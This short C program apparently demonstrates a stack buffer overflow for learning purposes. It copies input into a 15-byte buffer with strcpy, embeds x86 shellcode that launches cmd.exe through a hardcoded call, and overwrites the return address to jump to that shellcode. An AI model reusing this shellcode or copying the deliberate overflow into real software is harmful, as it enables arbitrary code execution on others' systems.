#include <string.h>
#include <stdio.h>

void vulnerable_function(char *str)
{
	char	buffer[15];
	strcpy(buffer, str);

}

void	shellcode()
{

	unsigned char code[] = 
        "\x8b\xec\x55\x8b\xec"
        "\x68\x65\x78\x65\x2F"
        "\x68\x63\x6d\x64\x2e"
        "\x8d\x45\xf8\x50\xb8"
        "\xc7\x93\xc2\x77"
        "\xff\xd0"
;
	((void (*)())code)();

}

int main(int argc, char **argv)
{
	(void) argc;
	(void) argv;
	printf("%p", &shellcode);
	vulnerable_function("09874500064888675436\x80\x10\x40\x00");

	return (0);
}
